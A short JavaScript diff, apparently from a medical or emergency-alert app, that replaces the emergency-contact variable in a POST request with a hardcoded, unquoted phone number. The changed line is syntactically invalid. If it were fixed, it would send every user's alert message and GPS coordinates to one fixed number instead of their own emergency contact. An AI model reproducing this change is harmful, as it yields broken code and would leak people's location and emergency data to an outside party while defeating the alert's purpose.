@@ -718,7 +718,7 @@ exports.formatMedicalProfile = async (profile) => {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        to: emergencyContactNum,  
+                        to: +91 8528576249,  
                         body: message,
                         latitude: latitude || null,
                         longitude: longitude || null
